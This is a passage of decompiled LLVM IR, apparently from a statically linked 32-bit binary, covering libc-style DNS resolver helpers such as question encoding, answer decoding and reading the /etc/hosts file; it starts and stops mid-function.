  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_805433b = load i32, i32* @eax, align 4
  %v1_805433e = inttoptr i32 %tmp to i32*
  %v2_805433e = load i32, i32* %v1_805433e, align 4
  %v7_8054340 = inttoptr i32 %v2_805433e to i8*
  %v8_8054340 = call i32 @__encode_dotted(i8* %v7_8054340, i32 %tmp2, i32 %tmp3, i32 %v0_805433b, i32 %v0_805432e, i32 %v0_805432d, i32 %v0_805432c)
  %v2_8054348 = icmp slt i32 %v8_8054340, 0
  store i32 %v8_8054340, i32* @ecx, align 4
  br i1 %v2_8054348, label %dec_label_pc_8054379, label %dec_label_pc_805434e

dec_label_pc_805434e:                             ; preds = %entry
  %v0_805434e = load i32, i32* @ebx, align 4
  %v2_805434e = sub i32 %v0_805434e, %v8_8054340
  %v1_8054350 = add i32 %v2_805434e, -3
  %v6_8054350 = sub i32 2, %v2_805434e
  %v7_8054350 = and i32 %v6_8054350, %v2_805434e
  %v8_8054350 = icmp slt i32 %v7_8054350, 0
  %v9_8054350 = icmp eq i32 %v1_8054350, 0
  %v10_8054350 = icmp slt i32 %v1_8054350, 0
  %v3_8054353 = icmp eq i1 %v10_8054350, %v8_8054350
  %v4_8054353 = icmp eq i1 %v9_8054350, false
  %v5_8054353 = and i1 %v4_8054353, %v3_8054353
  br i1 %v5_8054353, label %dec_label_pc_805435a, label %dec_label_pc_8054355

dec_label_pc_8054355:                             ; preds = %dec_label_pc_805434e
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8054379

dec_label_pc_805435a:                             ; preds = %dec_label_pc_805434e
  %v0_805435a = load i32, i32* @edi, align 4
  %v2_805435a = add i32 %v0_805435a, %v8_8054340
  store i32 %v2_805435a, i32* @edx, align 4
  %v0_805435d = load i32, i32* @esi, align 4
  %v1_805435d = add i32 %v0_805435d, 5
  %v2_805435d = inttoptr i32 %v1_805435d to i8*
  %v3_805435d = load i8, i8* %v2_805435d, align 1
  %v1_8054361 = add i32 %v8_8054340, 4
  store i32 %v1_8054361, i32* @ecx, align 4
  %v3_8054364 = inttoptr i32 %v2_805435a to i8*
  store i8 %v3_805435d, i8* %v3_8054364, align 1
  %v0_8054366 = load i32, i32* @esi, align 4
  %v1_8054366 = add i32 %v0_8054366, 4
  %v2_8054366 = inttoptr i32 %v1_8054366 to i32*
  %v3_8054366 = load i32, i32* %v2_8054366, align 4
  %v1_8054369 = trunc i32 %v3_8054366 to i8
  %v2_8054369 = load i32, i32* @edx, align 4
  %v3_8054369 = add i32 %v2_8054369, 1
  %v4_8054369 = inttoptr i32 %v3_8054369 to i8*
  store i8 %v1_8054369, i8* %v4_8054369, align 1
  %v0_805436c = load i32, i32* @esi, align 4
  %v1_805436c = add i32 %v0_805436c, 9
  %v2_805436c = inttoptr i32 %v1_805436c to i8*
  %v3_805436c = load i8, i8* %v2_805436c, align 1
  %v2_8054370 = load i32, i32* @edx, align 4
  %v3_8054370 = add i32 %v2_8054370, 2
  %v4_8054370 = inttoptr i32 %v3_8054370 to i8*
  store i8 %v3_805436c, i8* %v4_8054370, align 1
  %v0_8054373 = load i32, i32* @esi, align 4
  %v1_8054373 = add i32 %v0_8054373, 8
  %v2_8054373 = inttoptr i32 %v1_8054373 to i32*
  %v3_8054373 = load i32, i32* %v2_8054373, align 4
  %v1_8054376 = trunc i32 %v3_8054373 to i8
  %v2_8054376 = load i32, i32* @edx, align 4
  %v3_8054376 = add i32 %v2_8054376, 3
  %v4_8054376 = inttoptr i32 %v3_8054376 to i8*
  store i8 %v1_8054376, i8* %v4_8054376, align 1
  %v0_805437a.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8054379

dec_label_pc_8054379:                             ; preds = %entry, %dec_label_pc_8054355, %dec_label_pc_805435a
  %v0_805437a = phi i32 [ %v8_8054340, %entry ], [ -1, %dec_label_pc_8054355 ], [ %v0_805437a.pre, %dec_label_pc_805435a ]
  %v2_8054379 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054379, i32* @ebx, align 4
  store i32 %v0_805432c, i32* @edi, align 4
  ret i32 %v0_805437a

; uselistorder directives
  uselistorder i32 %v1_8054350, { 1, 0 }
  uselistorder i32 %v2_805434e, { 0, 2, 1 }
  uselistorder i32 %v8_8054340, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 8, 4, 5, 6, 0, 7 }
  uselistorder label %dec_label_pc_8054379, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_805438b = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_8054390 = icmp slt i32 %v2_805438b, 0
  %v1_8054392 = add i32 %v2_805438b, 4
  %v1_8054395 = icmp eq i1 %v2_8054390, false
  %v4_8054395 = select i1 %v1_8054395, i32 %v1_8054392, i32 %v2_805438b
  ret i32 %v4_8054395

; uselistorder directives
  uselistorder i32 %v2_805438b, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805439c = load i32, i32* @ebp, align 4
  %v0_805439d = load i32, i32* @edi, align 4
  %v0_805439e = load i32, i32* @esi, align 4
  %v0_805439f = load i32, i32* @ebx, align 4
  store i32 %v0_805439f, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_80543c0 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80543c0, i32* %eax.global-to-local, align 4
  %v4_80543cd = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_80543c0, i32 256)
  store i32 %v4_80543cd, i32* %eax.global-to-local, align 4
  %v3_80543d5 = icmp slt i32 %v4_80543cd, 0
  store i32 %v4_80543cd, i32* @edi, align 4
  br i1 %v3_80543d5, label %dec_label_pc_8054488, label %dec_label_pc_80543df

dec_label_pc_80543df:                             ; preds = %entry
  %v0_80543df = load i32, i32* @ebx, align 4
  %v3_80543df = add i32 %v0_80543df, %v4_80543cd
  %v0_80543e1 = load i32, i32* @esi, align 4
  %v2_80543e1 = sub i32 %v0_80543e1, %v3_80543df
  %v1_80543e3 = add i32 %v2_80543e1, -10
  %v10_80543e3 = icmp slt i32 %v1_80543e3, 0
  store i32 %v1_80543e3, i32* @esi, align 4
  %v1_80543ee = icmp eq i1 %v10_80543e3, false
  br i1 %v1_80543ee, label %dec_label_pc_80543f7, label %dec_label_pc_80543f0

dec_label_pc_80543f0:                             ; preds = %dec_label_pc_80543df
  br label %dec_label_pc_8054488

dec_label_pc_80543f7:                             ; preds = %dec_label_pc_80543df
  %v6_80543fe = add i32 %v3_80543df, %tmp4
  store i32 %v6_80543fe, i32* @ebx, align 4
  store i32 %v2_80543c0, i32* %eax.global-to-local, align 4
  %v1_805440a = bitcast i32* %stack_var_-272 to i8*
  %v2_805440a = call i32 @__GI_strdup(i8* %v1_805440a)
  store i32 %v2_805440a, i32* %eax.global-to-local, align 4
  %v0_805440f = load i32, i32* @ebx, align 4
  %v1_805440f = add i32 %v0_805440f, 4
  store i32 %v1_805440f, i32* %esi.global-to-local, align 4
  %v1_8054412 = load i32, i32* @ebp, align 4
  %v2_8054412 = inttoptr i32 %v1_8054412 to i32*
  store i32 %v2_805440a, i32* %v2_8054412, align 4
  %v0_8054415 = load i32, i32* @ebx, align 4
  %v1_8054415 = inttoptr i32 %v0_8054415 to i8*
  %v2_8054415 = load i8, i8* %v1_8054415, align 1
  %v3_8054415 = zext i8 %v2_8054415 to i32
  store i32 %v3_8054415, i32* %eax.global-to-local, align 4
  %v1_8054418 = add i32 %v0_8054415, 1
  %v2_8054418 = inttoptr i32 %v1_8054418 to i8*
  %v3_8054418 = load i8, i8* %v2_8054418, align 1
  %v4_8054418 = zext i8 %v3_8054418 to i32
  store i32 %v4_8054418, i32* %edx.global-to-local, align 4
  %v2_805441c = mul nuw nsw i32 %v3_8054415, 256
  %v2_805441f = or i32 %v4_8054418, %v2_805441c
  store i32 %v2_805441f, i32* %eax.global-to-local, align 4
  %v1_8054421 = load i32, i32* @ebp, align 4
  %v2_8054421 = add i32 %v1_8054421, 4
  %v3_8054421 = inttoptr i32 %v2_8054421 to i32*
  store i32 %v2_805441f, i32* %v3_8054421, align 4
  %v0_8054424 = load i32, i32* @ebx, align 4
  %v1_8054424 = add i32 %v0_8054424, 2
  %v2_8054424 = inttoptr i32 %v1_8054424 to i8*
  %v3_8054424 = load i8, i8* %v2_8054424, align 1
  %v4_8054424 = zext i8 %v3_8054424 to i32
  store i32 %v4_8054424, i32* %eax.global-to-local, align 4
  %v1_8054428 = add i32 %v0_8054424, 3
  %v2_8054428 = inttoptr i32 %v1_8054428 to i8*
  %v3_8054428 = load i8, i8* %v2_8054428, align 1
  %v4_8054428 = zext i8 %v3_8054428 to i32
  store i32 %v4_8054428, i32* %edx.global-to-local, align 4
  %v2_805442c = mul nuw nsw i32 %v4_8054424, 256
  %v2_805442f = or i32 %v4_8054428, %v2_805442c
  store i32 %v2_805442f, i32* %eax.global-to-local, align 4
  %v1_8054431 = load i32, i32* @ebp, align 4
  %v2_8054431 = add i32 %v1_8054431, 8
  %v3_8054431 = inttoptr i32 %v2_8054431 to i32*
  store i32 %v2_805442f, i32* %v3_8054431, align 4
  %v0_8054434 = load i32, i32* @ebx, align 4
  %v1_8054434 = add i32 %v0_8054434, 4
  %v2_8054434 = inttoptr i32 %v1_8054434 to i8*
  %v3_8054434 = load i8, i8* %v2_8054434, align 1
  %v4_8054434 = zext i8 %v3_8054434 to i32
  store i32 %v4_8054434, i32* %edx.global-to-local, align 4
  %v0_8054438 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054438 = add i32 %v0_8054438, 1
  %v2_8054438 = inttoptr i32 %v1_8054438 to i8*
  %v3_8054438 = load i8, i8* %v2_8054438, align 1
  %v4_8054438 = zext i8 %v3_8054438 to i32
  store i32 %v4_8054438, i32* %eax.global-to-local, align 4
  %v1_805443c = add i32 %v0_8054438, 2
  %v2_805443c = inttoptr i32 %v1_805443c to i8*
  %v3_805443c = load i8, i8* %v2_805443c, align 1
  %v4_805443c = zext i8 %v3_805443c to i32
  %v2_8054440 = mul nuw i32 %v4_8054434, 16777216
  %v2_8054443 = mul nuw nsw i32 %v4_8054438, 65536
  store i32 %v2_8054443, i32* %eax.global-to-local, align 4
  %v2_8054446 = or i32 %v2_8054443, %v2_8054440
  store i32 %v2_8054446, i32* %edx.global-to-local, align 4
  %v1_8054448 = add i32 %v0_8054438, 3
  %v2_8054448 = inttoptr i32 %v1_8054448 to i8*
  %v3_8054448 = load i8, i8* %v2_8054448, align 1
  %v4_8054448 = zext i8 %v3_8054448 to i32
  store i32 %v4_8054448, i32* %eax.global-to-local, align 4
  %v2_805444c = mul nuw nsw i32 %v4_805443c, 256
  %v2_805444f = or i32 %v4_8054448, %v2_8054446
  store i32 %v2_805444f, i32* %edx.global-to-local, align 4
  %v2_8054451 = or i32 %v2_805444f, %v2_805444c
  store i32 %v2_8054451, i32* @ecx, align 4
  %v1_8054453 = load i32, i32* @ebp, align 4
  %v2_8054453 = add i32 %v1_8054453, 12
  %v3_8054453 = inttoptr i32 %v2_8054453 to i32*
  store i32 %v2_8054451, i32* %v3_8054453, align 4
  %v0_8054456 = load i32, i32* @ebx, align 4
  %v1_8054456 = add i32 %v0_8054456, 8
  %v2_8054456 = inttoptr i32 %v1_8054456 to i8*
  %v3_8054456 = load i8, i8* %v2_8054456, align 1
  %v4_8054456 = zext i8 %v3_8054456 to i32
  store i32 %v4_8054456, i32* %edx.global-to-local, align 4
  %v1_805445a = add i32 %v0_8054456, 9
  %v2_805445a = inttoptr i32 %v1_805445a to i8*
  %v3_805445a = load i8, i8* %v2_805445a, align 1
  %v4_805445a = zext i8 %v3_805445a to i32
  store i32 %v4_805445a, i32* %eax.global-to-local, align 4
  %v1_805445e = add i32 %v0_8054456, 10
  %v1_8054461 = load i32, i32* @ebp, align 4
  %v2_8054461 = add i32 %v1_8054461, 20
  %v3_8054461 = inttoptr i32 %v2_8054461 to i32*
  store i32 %v1_805445e, i32* %v3_8054461, align 4
  %v0_8054464 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054464 = mul i32 %v0_8054464, 256
  %v1_8054467 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054467 = or i32 %v1_8054467, %v2_8054464
  store i32 %v2_8054467, i32* @edx, align 4
  %v1_8054469 = load i32, i32* @ebp, align 4
  %v2_8054469 = add i32 %v1_8054469, 16
  %v3_8054469 = inttoptr i32 %v2_8054469 to i32*
  store i32 %v2_8054467, i32* %v3_8054469, align 4
  %v1_8054473 = add i32 %v3_80543df, 10
  store i32 %v1_8054473, i32* %eax.global-to-local, align 4
  %v1_8054476 = load i32, i32* @ebp, align 4
  %v2_8054476 = add i32 %v1_8054476, 24
  %v3_8054476 = inttoptr i32 %v2_8054476 to i32*
  store i32 %v1_8054473, i32* %v3_8054476, align 4
  %v4_8054479 = load i32, i32* @edx, align 4
  %v5_805447d = icmp slt i32 %v1_80543e3, %v4_8054479
  br i1 %v5_805447d, label %dec_label_pc_805447f, label %dec_label_pc_8054484

dec_label_pc_805447f:                             ; preds = %dec_label_pc_80543f7
  br label %dec_label_pc_8054488

dec_label_pc_8054484:                             ; preds = %dec_label_pc_80543f7
  %v1_8054484 = load i32, i32* @edi, align 4
  %v2_8054484 = add i32 %v4_8054479, 10
  %v3_8054484 = add i32 %v2_8054484, %v1_8054484
  br label %dec_label_pc_8054488

dec_label_pc_8054488:                             ; preds = %entry, %dec_label_pc_805447f, %dec_label_pc_80543f0, %dec_label_pc_8054484
  %v0_805448e = phi i32 [ %v4_80543cd, %entry ], [ -1, %dec_label_pc_805447f ], [ %v1_80543e3, %dec_label_pc_80543f0 ], [ %v3_8054484, %dec_label_pc_8054484 ]
  store i32 %v0_805448e, i32* %eax.global-to-local, align 4
  %v2_8054490 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054490, i32* @ebx, align 4
  store i32 %v0_805439e, i32* @esi, align 4
  store i32 %v0_805439d, i32* @edi, align 4
  store i32 %v0_805439c, i32* @ebp, align 4
  ret i32 %v0_805448e

; uselistorder directives
  uselistorder i32 %v0_805448e, { 1, 0 }
  uselistorder i32 %v2_8054443, { 1, 0 }
  uselistorder i32 %v1_80543e3, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80543df, { 1, 0, 2 }
  uselistorder i32 %v4_80543cd, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_80543c0, { 1, 0, 2 }
  uselistorder i32 24, { 29, 30, 19, 0, 31, 32, 33, 20, 4, 9, 36, 10, 11, 12, 34, 21, 22, 23, 24, 25, 26, 27, 38, 1, 35, 13, 14, 15, 16, 17, 2, 18, 3, 5, 6, 7, 8, 28, 37 }
  uselistorder i32 20, { 31, 32, 33, 34, 1, 20, 38, 4, 39, 35, 36, 2, 21, 22, 0, 6, 7, 30, 8, 9, 10, 23, 24, 25, 26, 27, 5, 28, 29, 41, 37, 3, 11, 12, 13, 14, 15, 16, 17, 18, 19, 40 }
  uselistorder i32 9, { 16, 17, 18, 19, 5, 20, 10, 11, 4, 9, 0, 6, 12, 13, 14, 15, 7, 8, 2, 1, 21, 22, 3 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 7, 9, 8, 11, 10 }
  uselistorder i32 3, { 47, 48, 49, 50, 51, 52, 20, 0, 11, 1, 21, 2, 16, 46, 3, 53, 22, 5, 4, 6, 9, 10, 8, 23, 12, 24, 39, 19, 40, 29, 54, 17, 18, 30, 25, 14, 15, 7, 27, 45, 26, 31, 32, 33, 34, 35, 41, 42, 43, 44, 28, 36, 37, 38, 13 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8054488, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_80544a5 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_8058685.258 to i32), i32 ptrtoint (i32* @global_var_8058650.246 to i32))
  store i32 %v3_80544a5, i32* @eax, align 4
  %v1_80544ad = icmp eq i32 %v3_80544a5, 0
  %v1_80544af = icmp eq i1 %v1_80544ad, false
  br i1 %v1_80544af, label %dec_label_pc_80544c5, label %dec_label_pc_80544b1

dec_label_pc_80544b1:                             ; preds = %entry
  %v3_80544bd = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_8058690.259 to i32), i32 ptrtoint (i32* @global_var_8058650.246 to i32))
  br label %dec_label_pc_80544c5

dec_label_pc_80544c5:                             ; preds = %entry, %dec_label_pc_80544b1
  %v0_80544c8 = phi i32 [ %v3_80544a5, %entry ], [ %v3_80544bd, %dec_label_pc_80544b1 ]
  ret i32 %v0_80544c8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8058650.246 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_80544c5, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_80544c9 = load i32, i32* @ebp, align 4
  %v0_80544ca = load i32, i32* @edi, align 4
  %v0_80544cb = load i32, i32* @esi, align 4
  %v0_80544cc = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_80544da = sub i32 0, %arg6
  %v1_80544dc = urem i32 %v1_80544da, 4
  %v2_80544dc = icmp eq i32 %v1_80544dc, 0
  store i32 %v1_80544dc, i32* %eax.global-to-local, align 4
  br i1 %v2_80544dc, label %dec_label_pc_80544ed, label %dec_label_pc_80544e1

dec_label_pc_80544e1:                             ; preds = %entry
  %v2_80544e1 = sub i32 %arg7, %v1_80544dc
  %v7_80544e1 = icmp ugt i32 %v1_80544dc, %arg7
  br i1 %v7_80544e1, label %dec_label_pc_8054791, label %dec_label_pc_80544e9

dec_label_pc_80544e9:                             ; preds = %dec_label_pc_80544e1
  %v2_80544e9 = add i32 %v1_80544dc, %arg6
  store i32 %v2_80544e9, i32* @ebx, align 4
  store i32 %v2_80544e1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80544ed

dec_label_pc_80544ed:                             ; preds = %entry, %dec_label_pc_80544e9
  %v0_80544fb = phi i32 [ %arg6, %entry ], [ %v2_80544e9, %dec_label_pc_80544e9 ]
  %v0_8054502 = phi i32 [ %arg7, %entry ], [ %v2_80544e1, %dec_label_pc_80544e9 ]
  %tmp = icmp ult i32 %v0_8054502, 32
  br i1 %tmp, label %dec_label_pc_8054791, label %dec_label_pc_80544f6

dec_label_pc_80544f6:                             ; preds = %dec_label_pc_80544ed
  %v12_80544f6 = icmp eq i32 %arg4, 1
  %v1_80544fb = add i32 %v0_80544fb, 32
  store i32 %v1_80544fb, i32* %eax.global-to-local, align 4
  %v1_8054502 = add i32 %v0_8054502, -32
  store i32 %v1_8054502, i32* @ebp, align 4
  br i1 %v12_80544f6, label %dec_label_pc_80544f6.dec_label_pc_8054641_crit_edge, label %dec_label_pc_805450b

dec_label_pc_80544f6.dec_label_pc_8054641_crit_edge: ; preds = %dec_label_pc_80544f6
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8054641

dec_label_pc_805450b:                             ; preds = %dec_label_pc_80544f6
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8054512 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8054512, align 4
  %tmp144 = icmp ult i32 %v1_8054502, 4
  br i1 %tmp144, label %dec_label_pc_8054791, label %dec_label_pc_805451e

dec_label_pc_805451e:                             ; preds = %dec_label_pc_805450b
  %v0_805451e = load i32, i32* %edx.global-to-local, align 4
  %v1_805451e = add i32 %v0_805451e, -36
  store i32 %v1_805451e, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ult i32 %v1_805451e, 8
  br i1 %tmp145, label %dec_label_pc_8054791, label %dec_label_pc_805452a

dec_label_pc_805452a:                             ; preds = %dec_label_pc_805451e
  %v0_805452a = load i32, i32* @ebp, align 4
  %tmp146 = icmp ult i32 %v0_805452a, 16
  br i1 %tmp146, label %dec_label_pc_8054791, label %dec_label_pc_8054533

dec_label_pc_8054533:                             ; preds = %dec_label_pc_805452a
  %v1_8054533 = add i32 %v0_805451e, -48
  store i32 %v1_8054533, i32* %eax.global-to-local, align 4
  %tmp147 = icmp ult i32 %v1_8054533, 8
  br i1 %tmp147, label %dec_label_pc_8054791, label %dec_label_pc_805453f

dec_label_pc_805453f:                             ; preds = %dec_label_pc_8054533
  %v0_805453f = load i32, i32* @ebx, align 4
  %v1_805453f = add i32 %v0_805453f, 48
  %v1_8054542 = add i32 %v0_805451e, -44
  store i32 %v1_8054542, i32* @ebp, align 4
  %v1_8054549 = add i32 %v0_805451e, -56
  store i32 %v1_8054549, i32* @eax, align 4
  %v7_805454c = icmp ult i32 %v1_8054549, %v1_8054542
  %v1_805454e = add i32 %v0_805453f, 36
  store i32 %v1_805454e, i32* @edi, align 4
  br i1 %v7_805454c, label %dec_label_pc_8054558, label %dec_label_pc_8054553

dec_label_pc_8054553:                             ; preds = %dec_label_pc_805453f
  %v1_8054553 = add i32 %v0_805453f, 44
  store i32 %v1_8054553, i32* @esi, align 4
  br label %dec_label_pc_805455d

dec_label_pc_8054558:                             ; preds = %dec_label_pc_805453f
  %v1_8054558 = add i32 %v0_805453f, 56
  store i32 %v1_8054558, i32* @esi, align 4
  store i32 %v1_8054549, i32* @ebp, align 4
  br label %dec_label_pc_805455d

dec_label_pc_805455d:                             ; preds = %dec_label_pc_8054553, %dec_label_pc_8054558
  %v0_805455d = phi i32 [ %v1_8054542, %dec_label_pc_8054553 ], [ %v1_8054549, %dec_label_pc_8054558 ]
  %tmp148 = icmp ult i32 %v0_805455d, 80
  br i1 %tmp148, label %dec_label_pc_8054791, label %dec_label_pc_8054566

dec_label_pc_8054566:                             ; preds = %dec_label_pc_805455d
  %v0_8054566 = call i32 @__open_etc_hosts()
  store i32 %v0_8054566, i32* %eax.global-to-local, align 4
  %v1_805456b = icmp eq i32 %v0_8054566, 0
  br i1 %v1_805456b, label %dec_label_pc_8054593, label %dec_label_pc_8054573

dec_label_pc_8054573:                             ; preds = %dec_label_pc_8054566
  store i32 %v1_80544fb, i32* %edx.global-to-local, align 4
  store i32 %v1_805453f, i32* %eax.global-to-local, align 4
  %v0_805457b = load i32, i32* @edi, align 4
  %v0_805457f = load i32, i32* @esi, align 4
  %v4_8054583 = inttoptr i32 %v1_80544fb to i8*
  br label %dec_label_pc_8054641

dec_label_pc_8054593:                             ; preds = %dec_label_pc_8054566
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8054597 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8054597, align 4
  %v1_805459d = call i32 @__errno_location(i32 0)
  store i32 %v1_805459d, i32* %eax.global-to-local, align 4
  %v1_80545a2 = inttoptr i32 %v1_805459d to i32*
  %v2_80545a2 = load i32, i32* %v1_80545a2, align 4
  store i32 %v2_80545a2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054791

dec_label_pc_80545ad:                             ; preds = %dec_label_pc_8054714
  %v2_80545ad = load i8*, i8** %stack_var_-44, align 4
  %v3_80545ad = ptrtoint i8* %v2_80545ad to i32
  store i32 %v3_80545ad, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_80545b4 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_80545ad, i32* %v2_80545b4, align 4
  %v0_80545b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80545b6 = add i32 %v0_80545b6, 4
  %v2_80545b6 = inttoptr i32 %v1_80545b6 to i32*
  store i32 0, i32* %v2_80545b6, align 4
  %v0_80545bd = load i32, i32* @ebx, align 4
  %v1_80545bd = add i32 %v0_80545bd, 4
  %v2_80545bd = inttoptr i32 %v1_80545bd to i32*
  %v3_80545bd = load i32, i32* %v2_80545bd, align 4
  store i32 %v3_80545bd, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_80545bd, i32* %arg5, align 4
  %v1_80545c6 = add i32 %tmp60, 8
  %v2_80545c6 = inttoptr i32 %v1_80545c6 to i32*
  store i32 2, i32* %v2_80545c6, align 4
  %v0_80545cd = load i32, i32* %edx.global-to-local, align 4
  %v1_80545cd = add i32 %v0_80545cd, 12
  %v2_80545cd = inttoptr i32 %v1_80545cd to i32*
  store i32 4, i32* %v2_80545cd, align 4
  br label %dec_label_pc_8054606

dec_label_pc_80545da:                             ; preds = %dec_label_pc_8054736
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_80545e2 = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_80545e2, align 4
  %v0_80545e4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80545e4 = add i32 %v0_80545e4, 4
  %v2_80545e4 = inttoptr i32 %v1_80545e4 to i32*
  store i32 0, i32* %v2_80545e4, align 4
  %v0_80545eb = load i32, i32* @ebx, align 4
  %v1_80545eb = add i32 %v0_80545eb, 4
  %v2_80545eb = inttoptr i32 %v1_80545eb to i32*
  %v3_80545eb = load i32, i32* %v2_80545eb, align 4
  store i32 %v3_80545eb, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_80545eb, i32* %arg5, align 4
  %v1_80545f4 = add i32 %tmp60, 8
  %v2_80545f4 = inttoptr i32 %v1_80545f4 to i32*
  store i32 10, i32* %v2_80545f4, align 4
  %v0_80545fb = load i32, i32* %edx.global-to-local, align 4
  %v1_80545fb = add i32 %v0_80545fb, 12
  %v2_80545fb = inttoptr i32 %v1_80545fb to i32*
  store i32 16, i32* %v2_80545fb, align 4
  br label %dec_label_pc_8054606

dec_label_pc_8054606:                             ; preds = %dec_label_pc_80545ad, %dec_label_pc_80545da
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_80545ad ], [ %storemerge3, %dec_label_pc_80545da ]
  %v1_8054606 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054606 = add i32 %v1_8054606, 16
  %v3_8054606 = inttoptr i32 %v2_8054606 to i32*
  store i32 %storemerge, i32* %v3_8054606, align 4
  %v0_8054609 = load i32, i32* @ebx, align 4
  %v1_8054609 = add i32 %v0_8054609, 8
  %v1_805460c = load i32, i32* %edx.global-to-local, align 4
  %v2_805460c = add i32 %v1_805460c, 4
  %v3_805460c = inttoptr i32 %v2_805460c to i32*
  store i32 %v1_8054609, i32* %v3_805460c, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_8054613 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054613 = inttoptr i32 %arg8 to i32*
  store i32 %v0_8054613, i32* %v2_8054613, align 4
  br label %dec_label_pc_8054771

dec_label_pc_8054641:                             ; preds = %dec_label_pc_80544f6.dec_label_pc_8054641_crit_edge, %dec_label_pc_8054573
  %v1_8054645.pre-phi = phi i32* [ %.pre, %dec_label_pc_80544f6.dec_label_pc_8054641_crit_edge ], [ %v1_8054512, %dec_label_pc_8054573 ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_80544f6.dec_label_pc_8054641_crit_edge ], [ %v4_8054583, %dec_label_pc_8054573 ]
  %stack_var_-20.0.in = phi i32 [ %v1_80544fb, %dec_label_pc_80544f6.dec_label_pc_8054641_crit_edge ], [ %v0_805457f, %dec_label_pc_8054573 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_80544f6.dec_label_pc_8054641_crit_edge ], [ %v1_80544fb, %dec_label_pc_8054573 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_80544f6.dec_label_pc_8054641_crit_edge ], [ %v0_805457b, %dec_label_pc_8054573 ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_80544f6.dec_label_pc_8054641_crit_edge ], [ %v0_8054566, %dec_label_pc_8054573 ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_80544f6.dec_label_pc_8054641_crit_edge ], [ %v1_805453f, %dec_label_pc_8054573 ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8054645.pre-phi, align 4
  %v12_80546cf = icmp eq i32 %arg4, 2
  %v2_80546fa = inttoptr i32 %arg2 to i8*
  %v12_805470d = icmp eq i32 %arg3, 2
  %v12_805472f = icmp eq i32 %arg3, 10
  %v1_80546d9 = icmp eq i1 %v12_80546cf, false
  %v1_8054712 = icmp eq i1 %v12_805470d, false
  %v1_8054734 = icmp eq i1 %v12_805472f, false
  br label %dec_label_pc_8054757.outer

